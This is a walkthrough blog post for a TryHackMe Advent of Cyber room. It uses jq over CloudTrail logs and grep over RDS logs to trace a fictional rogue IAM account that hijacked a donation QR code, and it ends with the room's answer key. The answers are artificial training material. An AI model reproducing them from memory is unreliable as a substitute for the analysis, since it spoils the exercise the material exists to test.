<p>It might be overwhelming to see the sheer amount of information in one event, but there are some elements that we can focus on for our investigation:</p>

<table>
  <thead>
    <tr>
      <th><strong>Field</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>userIdentity</td>
      <td>Details of the user account that acted on an object.</td>
    </tr>
    <tr>
      <td>eventTime</td>
      <td>When did the action occur?</td>
    </tr>
    <tr>
      <td>eventType</td>
      <td>What type of event occurred? (e.g., AwsApiCall or AwsConsoleSignIn, AwsServiceEvent)</td>
    </tr>
    <tr>
      <td>eventSource</td>
      <td>From what service was the event logged?</td>
    </tr>
    <tr>
      <td>eventName</td>
      <td>What specific action occurred? (e.g., ListObjects, GetBucketObject)</td>
    </tr>
    <tr>
      <td>sourceIPAddress</td>
      <td>From what IP did the action happen?</td>
    </tr>
    <tr>
      <td>userAgent</td>
      <td>What user agent was used to perform the action? (e.g., Firefox, AWS CLI)</td>
    </tr>
    <tr>
      <td>requestParameters</td>
      <td>What parameters were involved in the action? (e.g., BucketName)</td>
    </tr>
  </tbody>
</table>

<p>By using the guide above, we can read the example log entry as follows:</p>

<ul>
  <li>The IAM user, <strong>wareville_collector</strong>, listed all objects (ListObjects event) of the S3 bucket named <strong>aoc-cloudtrail-wareville</strong>.</li>
  <li>The IP address from which this request originated is <strong>34.247.218.56</strong>.</li>
  <li>The user agent indicates that the request was made using the <strong>AWS SDK tool for Go</strong>.</li>
</ul>

<p>Now that we know where to look, let’s use JQ to filter the log for events related to the <strong>wareville-bank-account-qr.png</strong> S3 object. The goal is to use the same elements to filter the log file using JQ and format the results into a table to make it more readable. According to McSkidy, the logs are stored in the <code class="language-plaintext highlighter-rouge">~/wareville_logs</code> directory.</p>

<p>To start, click the <strong>Terminal</strong> icon on the Desktop and enter the two commands below:</p>

<p>ubuntu@tryhackme:~/</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/$ cd wareville_log</span><span class="err">s
</span><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/$ l</span><span class="err">s
</span><span class="nx">cloudtrail_log</span><span class="p">.</span><span class="nx">json</span>  <span class="nx">rds</span><span class="p">.</span><span class="nx">log</span>
</code></pre></div></div>

<p>With the commands above, we initially changed our current directory to the directory McSkidy mentioned via the <code class="language-plaintext highlighter-rouge">cd</code> command, and we listed the directory’s contents using the <code class="language-plaintext highlighter-rouge">ls</code> command. As you can see, two files are inside it, but we will focus first on the <strong>cloudtrail_log.json</strong> for this investigation.</p>

<p>Now, let’s start investigating the CloudTrail logs by executing the command below.</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares"</span><span class="se">)</span><span class="sr">' cloudtrail_log.jso</span><span class="err">n
</span></code></pre></div></div>

<p>Let’s do a quick breakdown of the command we executed:</p>

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">jq -r 'FILTER' cloudtrail_log.json</code></td>
      <td>The <strong>-r</strong> flag tells <strong>jq</strong> to output the results in RAW format instead of JSON. Note that the <strong>FILTER</strong> section is enclosed with single quotes.The last part of the command accepts the input file, which is <strong>cloudtrail_log.json</strong>.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">.Records[]</code></td>
      <td>Instructs <strong>jq</strong> to parse the events in the Records container element. The <strong>Records</strong> field is the top element in the JSON-formatted CloudTrail log.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">| select(.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares")</code></td>
      <td>Uses the previous command’s output, and filters it on the <strong>eventSource</strong> and <strong>requestParameters.bucketName</strong> keys.The value <strong>s3.amazonaws.com</strong> is used to filter events related to the Amazon AWS S3 service, and the value  <strong>wareville-care4wares</strong> is used to filter events related to the target S3 bucket.</td>
    </tr>
  </tbody>
</table>

<p>As you can see in the command output, we were able to trim down the results since all of the entries are from S3. However, it is still a bit overwhelming since all the fields are included in the output. Now, let’s refine the output by selecting the significant fields. Execute the following command below:</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A",.requestParameters.bucketName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .requestParameters.key </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .sourceIPAddress </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A"</span><span class="se">]</span><span class="sr">' cloudtrail_log.jso</span><span class="err">n
</span></code></pre></div></div>

<p>As you can see, we have appended another pipe (<code class="language-plaintext highlighter-rouge">|</code>) after our previous filter. Let’s discuss it quickly:</p>

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">| [.eventTime, .eventName, .userIdentity.userName // "N/A",.requestParameters.bucketName // "N/A", .requestParameters.key // "N/A", .sourceIPAddress // "N/A"])'</code></td>
      <td>The piped filter uses the previous command’s output and formats it to only include the defined keys, such as <strong>.eventTime</strong>, <strong>.eventName</strong>, and <strong>.userIdentity.userName</strong>.The defined keys are enclosed with square brackets (<code class="language-plaintext highlighter-rouge">[]</code>)  <strong>to process and create an array with the specified fields from each record</strong>.Note that the string <code class="language-plaintext highlighter-rouge">// "N/A"</code> is included purely for formatting reasons. This means that if the defined key does not have a value, it will display <strong>N/A</strong> instead.</td>
    </tr>
  </tbody>
</table>

<p>As you can see in the results, we could focus on the notable items, but our initial goal is to render the output in a table to make it easy to digest. Let’s upgrade our command with additional parameters.</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '</span><span class="se">[</span><span class="sr">"Event_Time", "Event_Name", "User_Name", "Bucket_Name", "Key", "Source_IP"</span><span class="se">]</span><span class="sr">,</span><span class="se">(</span><span class="sr">.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A",.requestParameters.bucketName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .requestParameters.key </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .sourceIPAddress </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A"</span><span class="se">])</span><span class="sr"> | @tsv' cloudtrail_log.json | column -</span><span class="err">t
</span></code></pre></div></div>

<p>You may observe that we have added the following items to our command:</p>

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">jq -r '["Event_Time", "Event_Name", "User_Name", "Bucket_Name", "Key", "Source_IP"], SELECT_FILTER | SPECIFIC FIELDS'</code></td>
      <td>The new command prepends a column header row and is defined using square brackets since it is an array that corresponds to the selected fields.Note that a comma is used before the select filter to combine with those of the select filter results we previously used.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">| @tsv'</code></td>
      <td>Sets each array element, the output processed after the filters, as a line of tab-separated values.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">| column -t -s $'\t'</code></td>
      <td>It takes the output of the <strong>jq</strong> command, now resulting in tab-separated values, and beautifies its result by processing all tabs and aligning the columns.</td>
    </tr>
  </tbody>
</table>

<p><strong>Note:</strong> Our crafted command lets us summarise S3 activities from a CloudTrail log.</p>

<p>Now that we have crafted a JQ query that provides a well-refined output, let’s look at the results and observe the events. Based on the columns, we can answer the following questions to build our assumptions:</p>

<ul>
  <li>How many log entries are related to the <strong>wareville-care4wares</strong> bucket?</li>
  <li>Which user initiated most of these log entries?</li>
  <li>Which actions did the user perform based on the <strong>eventName</strong> field?</li>
  <li>Were there any specific files edited?</li>
  <li>What is the timestamp of the log entries?</li>
  <li>What is the source IP related to these log entries?</li>
</ul>

<p>Looking at the results, 5 logged events seem related to the <strong>wareville-care4wares</strong> bucket, and almost all are related to the user glitch. Aside from listing the objects inside the bucket (ListOBject event), the most notable detail is that the user glitch uploaded the file <strong>wareville-bank-account-qr.png</strong> on November 28th. This seems to coincide with the information we received about no donations being made 2 days after the link was sent out.</p>

<p>McSkidy is sure there was no user glitch in the system before. There is no one in the city hall with that name, either. The only person that McSkidy knows with that name is the hacker who keeps to himself. McSkidy suggests that we look into this anomalous user.</p>

<h2 id="mcskidy-fooled-us">McSkidy Fooled Us?</h2>

<p>McSkidy wants to know what this anomalous user account has been used for, when it was created, and who created it. Enter the command below to see all the events related to the anomalous user. We can focus our analysis on the following questions:</p>

<ul>
  <li>What event types are included in these log entries?</li>
  <li>What is the timestamp of these log entries?</li>
  <li>Which IPs are included in these log entries?</li>
  <li>What tool/OS was used in these log entries?</li>
</ul>

<p>ubuntu@tryhackme:~/wareville_logs \n</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '</span><span class="se">[</span><span class="sr">"Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"</span><span class="se">]</span><span class="sr">,</span><span class="se">(</span><span class="sr">.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.userIdentity.userName == "glitch"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime, .eventSource, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .sourceIPAddress </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A"</span><span class="se">])</span><span class="sr"> | @tsv' cloudtrail_log.json | column -t -s $'</span><span class="se">\t</span><span class="err">'
</span></code></pre></div></div>

<p>The results show that the user glitch mostly targeted the S3 bucket. The notable event is the <strong>ConsoleLogin</strong> entry, which tells us that the account was used to access the AWS Management Console using a browser.</p>

<p>We still need information about which tool and OS were used in the requests. Let’s view the <strong>userAgent</strong> value related to these events using the following command.</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '</span><span class="se">[</span><span class="sr">"Event_Time", "Event_type", "Event_Name", "User_Name", "Source_IP", "User_Agent"</span><span class="se">]</span><span class="sr">,</span><span class="se">(</span><span class="sr">.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.userIdentity.userName == "glitch"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime,.eventType, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr">"N</span><span class="se">/</span><span class="sr">A",.sourceIPAddress </span><span class="se">//</span><span class="sr">"N</span><span class="se">/</span><span class="sr">A", .userAgent </span><span class="se">//</span><span class="sr">"N</span><span class="se">/</span><span class="sr">A"</span><span class="se">])</span><span class="sr"> | @tsv' cloudtrail_log.json | column -t -s $'</span><span class="se">\t</span><span class="err">'
</span></code></pre></div></div>

<p>There are two <strong>User-Agent</strong> values included in all log entries related to the <strong>glitch</strong> user:</p>

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard</code></td>
      <td>This is the userAgent string for the internal console used in AWS. It doesn’t provide much information.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</code></td>
      <td>This userAgent string provides us with 2 pieces of interesting information.The anomalous account uses a Google Chrome browser within a Mac OS system.</td>
    </tr>
  </tbody>
</table>

<p>An experienced attacker can forge these values, but we should not dismiss this information. It can be valuable when comparing different log entries for the same user. We will park the current information for now, let’s gather more information to connect the dots.</p>

<p>The next interesting event to look for is who created this anomalous user account. We will filter for all IAM-related events, and this can be done by using the select filter <code class="language-plaintext highlighter-rouge">.eventSource == "iam.amazonaws.com"</code>. Let’s execute the command below, and try to answer the following questions:</p>

<ul>
  <li>What Event Names are included in the log entries?</li>
  <li>What user executed these events?</li>
  <li>What is this user’s IP?</li>
</ul>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '</span><span class="se">[</span><span class="sr">"Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"</span><span class="se">]</span><span class="sr">, </span><span class="se">(</span><span class="sr">.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.eventSource == "iam.amazonaws.com"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime, .eventSource, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .sourceIPAddress </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A"</span><span class="se">])</span><span class="sr"> | @tsv' cloudtrail_log.json | column -t -s $'</span><span class="se">\t</span><span class="err">'
</span></code></pre></div></div>

<p>Based on the results, there are many ListPolicies events. By ignoring these events, it seems that the most significant IAM activity is about the user <strong>mcskidy</strong> invoking the <strong>CreateUser</strong> action and consequently invoking the <strong>AttachUserPolicy</strong> action. The source IP where the requests were made is <strong>53.94.201.69</strong>. Remember that it is the same IP the anomalous user glitch used.</p>

<p>Let’s have a more detailed look at the event related to the <strong>CreateUser</strong> action by executing the command below:</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq '.Records</span><span class="se">[]</span><span class="sr"> |select</span><span class="se">(</span><span class="sr">.eventSource=="iam.amazonaws.com" and .eventName== "CreateUser"</span><span class="se">)</span><span class="sr">' cloudtrail_log.jso</span><span class="err">n
</span></code></pre></div></div>

<p>Based on the request parameters of the output, it can be seen that it was the user, <strong>mcskidy</strong>, who created the anomalous account.</p>

<p>Now, we need to know what permissions the anomalous user has. It could be devastating if it has access to our whole environment. We need to filter for the <strong>AttachUserPolicy</strong> event to uncover the permissions set for the newly created user. This event applies access policies to users, defining the extent of access to the account. Let’s filter for the specific event by executing the command below.</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq '.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.eventSource=="iam.amazonaws.com" and .eventName== "AttachUserPolicy"</span><span class="se">)</span><span class="sr">' cloudtrail_log.jso</span><span class="err">n
</span></code></pre></div></div>

<p>McSkidy is baffled by these results. She knows that she did not create the anomalous user and did not assign the privileged access. She also doesn’t recognise the IP address involved in the events and does not use a Mac OS; she only uses a Windows machine. All this information is different to the typical IP address and machine used by McSkidy, so she wants to prove her innocence and asks to continue the investigation.</p>

<h2 id="logs-dont-lie">Logs Don’t Lie</h2>

<p>McSkidy suggests looking closely at the IP address and operating system related to all these anomalous events. Let’s use the following command below to continue with the investigation:</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '</span><span class="se">[</span><span class="sr">"Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"</span><span class="se">]</span><span class="sr">, </span><span class="se">(</span><span class="sr">.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.sourceIPAddress=="53.94.201.69"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime, .eventSource, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .sourceIPAddress </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A"</span><span class="se">])</span><span class="sr"> | @tsv' cloudtrail_log.json | column -t -s $'</span><span class="se">\t</span><span class="err">'
</span></code></pre></div></div>

<p>Based on the command output, three user accounts (<strong>mcskidy</strong>, <strong>glitch</strong>, and <strong>mayor_malware</strong>) were accessed from the same IP address. The next step is to check each user and see if they always work from that IP.</p>

<p>Let’s focus on each user and see if they always work from that IP. Enter the command below, and replace the <code class="language-plaintext highlighter-rouge">PLACEHOLDER</code> with the username.</p>

<ul>
  <li>\</li>
</ul>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '</span><span class="se">[</span><span class="sr">"Event_Time","Event_Source","Event_Name", "User_Name","User_Agent","Source_IP"</span><span class="se">]</span><span class="sr">,</span><span class="se">(</span><span class="sr">.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.userIdentity.userName=="PLACEHOLDER"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime, .eventSource, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A",.userAgent </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A",.sourceIPAddress </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A"</span><span class="se">])</span><span class="sr"> | @tsv' cloudtrail_log.json | column -t -s $'</span><span class="se">\t</span><span class="err">'
</span></code></pre></div></div>

<p>While gathering the information for each user, we can focus our investigation on the following questions:</p>

<ul>
  <li>Which IP does each user typically use to log into AWS?</li>
  <li>Which OS and browser does each user usually use?</li>
  <li>Are there any similarities or explicit differences between the IP addresses and operating systems used?</li>
</ul>

<p>Based on the results, we have proven that McSkidy used a different IP address before the unusual authentication was discovered. Moreover, all evidence seems to point towards another user after correlating the IP address and User-Agent used by each user. Who do you think it could be? McSkidy has processed all the investigation results and summarized them below:</p>

<ul>
  <li>The incident starts with an anomalous login with the user account <strong>mcskidy</strong> from IP <strong>53.94.201.69</strong>.</li>
  <li>Shortly after the login, an anomalous user account <strong>glitch</strong> was created.</li>
  <li>Then, the <strong>glitch</strong> user account was assigned administrator permissions.</li>
  <li>The <strong>glitch</strong> user account then accessed the S3 bucket named <strong>wareville-care4wares</strong> and replaced the <strong>wareville-bank-account-qr.png</strong> file with a new one. The IP address and User-Agent used to log into the <strong>glitch, mcskidy</strong>, and <strong>mayor_malware</strong> accounts were the same.</li>
  <li>the User-Agent string and Source IP of recurrent logins by the user account <strong>mcskidy</strong> are different.</li>
</ul>

<h2 id="definite-evidence">Definite Evidence</h2>

<p>McSkidy suggests gathering stronger proof that that person was behind this incident. Luckily, Wareville Bank cooperated with us and provided their database logs from their Amazon Relational Database Service (RDS). They also mentioned that these are captured through their CloudWatch, which differs from the CloudTrail logs as they are not stored in JSON format. For now, let’s look at the bank transactions stored in the <code class="language-plaintext highlighter-rouge">~/wareville_logs/rds.log</code> file.</p>

<p>Since the log entries are different from the logs we previously investigated, McSkidy provided some guidance on how to analyse them. According to her, we can use the following command to show all the bank transactions.</p>

<p><strong>Note:</strong> Grep is a Unix command-line utility used for searching strings within a file or an input stream.</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ grep INSERT rds.lo</span><span class="err">g
</span></code></pre></div></div>

<p>From the command above, McSkidy explained that all INSERT queries from the RDS log pertain to who received the donations made by the townspeople. Given this, we can see in the output the two recipients of all donations made within November 28th, 2024.</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">---</span><span class="nx">REDACTED</span> <span class="nx">FOR</span> <span class="nx">BREVITY</span><span class="o">---</span>
<span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mf">17.728</span><span class="nx">Z</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mf">17.728648</span><span class="nx">Z</span>	  <span class="mi">263</span> <span class="nx">Query</span>	<span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nf">wareville_bank_transactions </span><span class="p">(</span><span class="nx">account_number</span><span class="p">,</span> <span class="nx">account_owner</span><span class="p">,</span> <span class="nx">amount</span><span class="p">)</span> <span class="nc">VALUES </span><span class="p">(</span><span class="dl">'</span><span class="s1">8839 2219 1329 6917</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Care4wares Fund</span><span class="dl">'</span><span class="p">,</span> <span class="mf">342.80</span><span class="p">)</span>
<span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mf">18.569</span><span class="nx">Z</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mf">18.569279</span><span class="nx">Z</span>	  <span class="mi">263</span> <span class="nx">Query</span>	<span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nf">wareville_bank_transactions </span><span class="p">(</span><span class="nx">account_number</span><span class="p">,</span> <span class="nx">account_owner</span><span class="p">,</span> <span class="nx">amount</span><span class="p">)</span> <span class="nc">VALUES </span><span class="p">(</span><span class="dl">'</span><span class="s1">8839 2219 1329 6917</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Care4wares Fund</span><span class="dl">'</span><span class="p">,</span> <span class="mf">929.57</span><span class="p">)</span>
<span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mf">02.605</span><span class="nx">Z</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mf">02.605700</span><span class="nx">Z</span>	  <span class="mi">263</span> <span class="nx">Query</span>	<span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nf">wareville_bank_transactions </span><span class="p">(</span><span class="nx">account_number</span><span class="p">,</span> <span class="nx">account_owner</span><span class="p">,</span> <span class="nx">amount</span><span class="p">)</span> <span class="nc">VALUES </span><span class="p">(</span><span class="dl">'</span><span class="s1">----- REDACTED ----</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Mayor Malware</span><span class="dl">'</span><span class="p">,</span> <span class="mf">193.45</span><span class="p">)</span>
<span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mf">02.792</span><span class="nx">Z</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mf">02.792161</span><span class="nx">Z</span>	  <span class="mi">263</span> <span class="nx">Query</span>	<span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nf">wareville_bank_transactions </span><span class="p">(</span><span class="nx">account_number</span><span class="p">,</span> <span class="nx">account_owner</span><span class="p">,</span> <span class="nx">amount</span><span class="p">)</span> <span class="nc">VALUES </span><span class="p">(</span><span class="dl">'</span><span class="s1">----- REDACTED ----</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Mayor Malware</span><span class="dl">'</span><span class="p">,</span> <span class="mf">998.13</span><span class="p">)</span>
<span class="o">---</span><span class="nx">REDACTED</span> <span class="nx">FOR</span> <span class="nx">BREVITY</span><span class="o">---</span>
</code></pre></div></div>

<p>As shown above, the Care4wares Fund received all the donations until it changed into a different account at a specific time. The logs also reveal who received the donations afterwards, given the account owner’s name. With all these findings, McSkidy confirmed the assumptions made during the investigation of the S3 bucket since the sudden change in bank details was reflected in the database logs. The timeline of events collected by McSkidy explains the connection of actions conducted by the culprit.</p>

<table>
  <thead>
    <tr>
      <th><strong>Timestamp</strong></th>
      <th><strong>Source</strong></th>
      <th><strong>Event</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>2024-11-28 15:22:18</td>
      <td>CloudWatch RDS logs (rds.log)</td>
      <td>Last donation received by the Care4wares Fund.</td>
    </tr>
    <tr>
      <td>2024-11-28 15:22:39</td>
      <td>CloudTrail logs (cloudtrail_log.json)</td>
      <td>Bank details update on S3 bucket.</td>
    </tr>
    <tr>
      <td>2024-11-28 15:23:02</td>
      <td>CloudWatch RDS logs (rds.log)</td>
      <td>First donation received by Mayor Malware.</td>
    </tr>
  </tbody>
</table>

<h2 id="answer-the-questions-below">Answer the questions below</h2>

<p>What is the other activity made by the user glitch aside from the ListObject action?
PutObject</p>

<p>What is the source IP related to the S3 bucket activities of the user glitch?
53.94.201.69</p>

<p>Based on the eventSource field, what AWS service generates the ConsoleLogin event?
signin.amazonaws.com</p>

<p>When did the anomalous user trigger the ConsoleLogin event?
2024-11-28T15:21:54Z</p>

<p>What was the name of the user that was created by the mcskidy user?
glitch</p>

<p>What type of access was assigned to the anomalous user?
AdministratorAccess</p>

<p>Which IP does Mayor Malware typically use to log into AWS?
53.94.201.69</p>

<p>What is McSkidy’s actual IP address?
31.210.15.79</p>

<p>What is the bank account number owned by Mayor Malware?
2394 6912 7723 1294</p>

<p>Want to learn more about log analysis and how to interpret logs from different sources? Check out <a href="https://tryhackme.com/r/room/loguniverse">the Log Universe</a> room!</p>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day7Header.png" /><media:content medium="image" url="http://localhost:4000/Day7Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Try Hackme Advent of Cyber - Day 6</title><link href="http://localhost:4000/Day6" rel="alternate" type="text/html" title="Try Hackme Advent of Cyber - Day 6" /><published>2024-12-06T00:00:00-05:00</published><updated>2024-12-06T00:00:00-05:00</updated><id>http://localhost:4000/Day6</id><content type="html" xml:base="http://localhost:4000/Day6"><![CDATA[<p><em>Mayor Malware was scheming, quite full of delight, To ruin SOC-mas and frighten SOC teams. But Glitch and McSkidy had spoiled his plan, By uncovering secrets that exposed the man!</em></p>

<p>Mayor Malware slammed his hand on the table, his eyes narrowing as the report flashed on his screen. Glitch and McSkidy had uncovered his trail. He took a deep breath, calming himself. <em>“No matter,”</em> he muttered, a sinister grin forming. <em>“They may have found me but haven’t stopped me.”</em> His confidence stemmed from the malware he had crafted—so devious and advanced that it would easily evade detection.</p>

